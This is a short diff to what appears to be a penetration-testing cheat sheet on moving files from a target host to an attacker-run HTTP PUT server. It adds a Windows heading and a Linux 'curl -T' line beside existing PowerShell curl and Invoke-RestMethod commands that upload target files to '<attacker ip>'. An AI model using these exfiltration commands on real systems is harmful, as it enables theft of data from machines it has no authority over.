@@ -59,12 +59,20 @@ python HTTPutServer.py <attacker ip> <attacker port>
 
 Target host uploads files
 
+Windows
+
 ```powershell
 curl --upload-file test.txt http://<attacker ip>:<attacker port>/
 ```
 
 ```powershell
 Invoke-RestMethod -Uri http://<attacker ip>:<attacker port>/<remote file name> -Method PUT -InFile <target file>
+```
+
+Linux
+
+```shell
+curl -T test.txt http://<attacker ip>:<attacker port>/
 ```
 
 #### nc
